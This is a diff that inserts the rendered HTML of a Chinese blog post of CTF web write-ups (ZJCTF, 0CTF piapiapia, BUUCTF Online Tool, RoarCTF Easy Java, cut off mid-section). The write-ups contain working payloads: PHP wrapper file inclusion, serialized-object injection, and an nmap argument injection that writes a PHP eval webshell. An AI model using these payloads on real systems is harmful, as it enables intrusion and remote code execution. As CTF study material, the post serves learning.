@@ -1,31 +1,669 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>可惜没如果、m0nk3y‘s Blog | 可惜没如果、m0nk3y‘s Blog</title><meta name="keywords" content="文件包含,反序列化,RCE,Java,Unicode,tricks"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="[ZJCTF 2019]NiZhuanSiWei12345678910111213141516171819 &lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file">
+<meta property="og:type" content="article">
+<meta property="og:title" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:url" content="https://hack-for.fun/fb23.html">
+<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:description" content="[ZJCTF 2019]NiZhuanSiWei12345678910111213141516171819 &lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2020-02-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-25T08:45:07.289Z">
+<meta property="article:author" content="m0nk3y">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Unicode">
+<meta property="article:tag" content="tricks">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hack-for.fun/fb23"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache:theme.fragment_cache})
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .post-ad!=theme.ad.post
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
 
-    include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-08-25 16:45:07'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache:theme.fragment_cache})
-      
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">可惜没如果、m0nk3y‘s Blog</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-02-22T16:00:00.000Z" title="Created 2020-02-23 00:00:00">2020-02-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-25T08:45:07.289Z" title="Updated 2020-08-25 16:45:07">2020-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><a id="more"></a>
+
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这个绕过很简单: </p>
+<ul>
+<li>利用<code>php://input</code> 即可绕过<code>file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;</code> </li>
+</ul>
+<p>php://input 可以把POST请求过来的数据流当做文件进行处理 ,当然data:// 也可.</p>
+<ul>
+<li>第二个if 语句中,如果file中匹配到了flag,就exit();退出脚本,如果没有就进行文件包含<code>include($file)</code> 这里并且是任意文件包含.没有对变量file进行限制,这里我直接包含没有内容回显,用伪协议包含就可以了</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
+
+<p>对得到的内容进行 base64decode</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// 这上面就是base64decode的结果</span></span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload: </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223091031.png"></p>
+<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><blockquote>
+<p>知识点: <strong>反序列化长度变化尾部字符串逃逸</strong></p>
+</blockquote>
+<p>// 登录处,尝试注入没有报错,但是没有试盲注,爆破是不可能的,于是扫描一下目录</p>
+<p>成功扫描到了 <code>www.zip</code> 和 <code>register.php</code> </p>
+<p>记录一下做这道题学习的相关知识: 虽然有些以前知道</p>
+<blockquote>
+<p>声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。</p>
+<p>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</p>
+<p>静态属性不可以由对象通过 -&gt; 操作符来访问。</p>
+<p>类属性必须定义为公有，受保护，私有之一。如果用 <em>var</em> 定义，则被视为公有。</p>
+<p>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该<strong>方法默认为公有。</strong></p>
+<p><strong>同一个类的对象即使不是同一个实例也可以互相访问对方的私有与受保护成员</strong>。这是由于在这些对象的内部具体实现的细节都是已知的。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223111717.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223114534.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223114926.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223133130.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223142822.png"></p>
+<p><strong>对象继承(extends)</strong>: </p>
+<blockquote>
+<p>继承已为大家所熟知的一个程序设计特性，PHP 的对象模型也使用了继承。继承将会影响到类与类，对象与对象之间的关系。</p>
+<p>比如，当扩展一个类，子类就会继承父类所有公有的和受保护的方法。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。</p>
+<p>继承对于功能的设计和抽象是非常有用的，而且对于类似的对象增加新功能就无须重新再写这些公用的功能。</p>
+</blockquote>
+<p><strong>this, self, parent</strong>: </p>
+<ul>
+<li>this是指向当前对象的指针</li>
+<li>self是指向当前类的指针,不指向任何已近实例化后的对象,一般用来指向类中的静态变量</li>
+<li>parent是指向父类的指针</li>
+</ul>
+<p>读完了下载下来的这几个源码后,发现有用的只在 class.php 和 config.php(唯一存在flag字段的内容,说明flag一定是在config.php里面,那么现在的目标就是去读取config.php 的内容)</p>
+<p>在register.php 中: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile)); <span class="comment">// 必定存在一个序列化操作</span></span><br></pre></td></tr></table></figure>
+
+<p>在profile.php 中: 存在<code>文件操作函数</code>以及<code>可控</code>的参数 <code>photo</code> ,如果<code> photo</code> 为config.php 就能读取到flag, photo 输出是以base64的形式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>])); <span class="comment">// 如果photo 为 config.php 就可以读取flag</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223152029.png" alt="profile.php"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223152709.png" alt="update.php"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223153148.png" alt="class.php"></p>
+<p>这里的正则过滤掉了<code>where</code>(5) ,如果存在where等字段,就用<code>hacker</code>(6) 来替换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223153711.png"></p>
+<p>在update.php 中对数组profile 进行序列化储存后,在profile.php 进行反序列化,然后这道题的考点就在这两步操作中的一个很细节的点</p>
+<p>在反序列化<code>unserialize()</code> 时,会自动忽略掉能够正确序列化之后的内容( 也就是<strong>构造闭合</strong> ),从而忽略掉<code>upload/md5(filename)</code></p>
+<p>通过抓包来看一下数组的中元素的传递的顺序,也是 nickname 是位于photo之前的,所以可以想办法让nickname足够长,把upload那部分字段给”挤出去”  专业术语: <strong>反序列化长度变化尾部字符串逃逸</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223160846.png"></p>
+<p>再来理清一下思路: </p>
+<ul>
+<li>要使 photo 字段的内容为 config.php,构造闭合如下</li>
+</ul>
+<p><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> 这里一共 34 个字符.  那么在原来的 nickname中的<code>where....where...</code> 一共是170个字符,加上 <code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> 后为204个字符,相差34 个字符, 因为正则匹配把where 替换为 hacker ,每替换一个就增加 1个字符,现在用34个where就可以增加34个字符,导致构造的<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> 的效果为 <code>&quot;;&#125;</code> 是为了闭合nickname部分.</p>
+<p> <code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> 而后面这部分,就单独成为了 photo 的部分( <strong>尾部字符串逃逸</strong> ),到达效果</p>
+<ul>
+<li>绕过正则表达式和长度限制</li>
+</ul>
+<p>使用数组绕过 nickname[]=</p>
+<p>payload: </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223161427.png" alt="构造数组绕过strlen()和正则表达式"></p>
+<p>发包后在<code>/profile.php</code> 页面复制头像的地址,进行base64decode得到flag</p>
+<p>来参考一下一位师傅的分析文章中的图片(参考资料2) , 会更容易理解</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223165804.png"></p>
+<p>参考资料: </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96777110">https://blog.csdn.net/zz_Caleb/article/details/96777110</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/QV5ZV3Vb5y/">https://www.bbsmax.com/A/QV5ZV3Vb5y/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11444134.html">https://www.cnblogs.com/20175211lyz/p/11444134.html</a></p>
+<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; <span class="comment">// 设置XFF 头,获取真实IP</span></span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host); <span class="comment">// 对参数host增加一个单引号&#x27;</span></span><br><span class="line">    $host = escapeshellcmd($host); <span class="comment">// 对参数host中可能存在的危险符号进行转义</span></span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]); <span class="comment">// 对 glzjin和IP 进行md5</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox); <span class="comment">// 创建一个目录</span></span><br><span class="line">    chdir($sandbox); <span class="comment">// 切换当前目录</span></span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">    <span class="comment">// 这里使用了系统函数system()，并且存在可控的参数$host 那么很明显利用点就是这</span></span><br><span class="line">    <span class="comment">// 就是想办法使host中存在可以执行的shell 命令,如ls 然后再cat /flag之类</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有两个函数以前没遇到过，学习一下😀</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223205845.png"></p>
+<p>escapeshellarg 函数就是字符串增加一个单引号或者引用已经转码存在过的单引号, 就是可以把输入的参数用单引号给括起来(将传入的字符串解析为Linux 可以执行的语句),这样然后 <code> &#39;127.0.0.1|ls&#39;</code> 的话, 单引号就成功逃逸了成为 <code>&#39;&#39;127.0.0.1|ls&#39;&#39;</code> </p>
+<p>但是没有结果, 再回过头来发现,原因是这个system() 函数已经写死了</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line"><span class="comment">// 只能通过namp 的某些操作来读取flag</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223205752.png"></p>
+<blockquote>
+<p>escapeshellcmd 函数就是给一些危险的字符前添加反斜线\来进行转义</p>
+</blockquote>
+<p>在搜索这两个函数的同时，发现了如果这两个函数在一起使用，如果没有处理的话，就会导致<strong>参数注入</strong></p>
+<p>从参考资料3 中，这两个函数使用后，因为 ‘ ( escapeshellarg 为参数增加单引号 )和 \ (escapeshellcmd 进行转义)的原因，最后处理就成了两个参数，<code>\\</code> 也就只是去匹配\了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223221730.png" alt="反复理解,加深印象"></p>
+<p>现在来本地测一下这两个函数: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="comment">//var_dump(escapeshellarg($a));</span></span><br><span class="line">    <span class="comment">//echo escapeshellarg($a);</span></span><br><span class="line">    var_dump(escapeshellcmd($a));</span><br><span class="line">    <span class="keyword">echo</span> escapeshellcmd($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">// 输出结果为: string(2) &quot;\&#x27;&quot; 和 \&#x27; ,说明 escapeshellcmd,是在对不配对的&#x27;进行转义</span></span><br><span class="line">    <span class="comment">// 另一个函数的输出结果为: string(6) &quot;&#x27;&#x27;\&#x27;&#x27;&#x27;&quot; 和 &#x27;&#x27;\&#x27;&#x27;&#x27;,说明escapeshellarg是在保留原来的\&#x27;单引号的同时(通过转义),再引用单引号将左右两部括起来从而起到连接的作用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后为什么为做不出来的原因呢,因为escapeshellcmd 对 shell中的命令执行的操作符都进行了转义,导致无法进行利用, 那么直接无法利用, 那可不可以写一个webshell 然后找虚拟终端中执行吧.所以现在的思路就死如何写入webshell( 利用上面的system()函数和nmap ) 果然,nmap 是支持输出的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223222553.png"></p>
+<p>payload: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?host&#x3D;&#39;&lt;?php @eval($_POST[&quot;aaa&quot;]);?&gt; -oG shell.php &#39;</span><br><span class="line"># 这里有一点,如果习惯把一句话密码用单引号&#39;aaa&#39; 这里就不行,因为这里的所有内容都作为参数host的内容,因此只要遇见了单引号就变成&#39;&#39;aaa&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>参考资料： </p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">谈谈escapeshellarg参数绕过和注入的问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
+<p><a target="_blank" rel="noopener" href="https://nmap.org/man/zh/man-output.html">https://nmap.org/man/zh/man-output.html</a></p>
+<p>[5](<a target="_blank" rel="noopener" href="https://note.redmango.top/Online">https://note.redmango.top/Online</a> Tool(BUUCTF 2018)/)</p>
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><blockquote>
+<p><strong>任意文件下载, WEB-INF/web.xml 源码泄露</strong></p>
+</blockquote>
+<p>打开题目是一个登陆界面,并没有注册之类,并且通过题目也知道不可能是SQL注入,点击help me后</p>
+<p>跳转后的URL 为 : <code>/Download?filename=help.docx</code></p>
+<p>既然没有其他功能,从URL中可以看到是下载文件,得flag应该就是把含有flag的文件下载下来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224143000.png"></p>
+<p>为什么是 <code>WEB-INF/</code> 泄露呢?</p>
+<p>因为从题目知道是关于 java web 的题目, tomcat 是用java web写的, Tomcat的配置目录中存在一个<code>WEB-INF\XXX</code> XXX就是下面这些东西,其中 <code>web.xml</code> 就是web应用程序配置文件, 那么既然是任意文件下载,那肯定先把配置文件下载下来啊</p>
+<blockquote>
